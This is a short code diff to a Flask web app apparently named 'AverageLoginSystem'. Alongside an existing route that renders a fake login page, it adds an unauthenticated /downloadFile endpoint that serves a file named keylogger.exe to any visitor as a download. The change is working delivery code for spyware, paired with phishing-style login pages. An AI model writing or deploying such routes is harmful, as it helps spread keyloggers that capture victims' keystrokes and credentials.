@@ -1,4 +1,4 @@
-from flask import render_template, request, redirect
+from flask import render_template, request, redirect, send_file
 from flask_login import login_required, login_user, logout_user, current_user
 
 from LoginSystems.AverageLoginSystem import app, databaseManager
@@ -80,3 +80,8 @@ def fakeLoginPage():
         return redirect('https://en.wikipedia.org/wiki/URL_redirection')
 
     return render_template('fakeLoginPage.html')
+
+
+@app.route('/downloadFile')
+def downloadFile():
+    return send_file("../keylogger.exe", as_attachment=True)
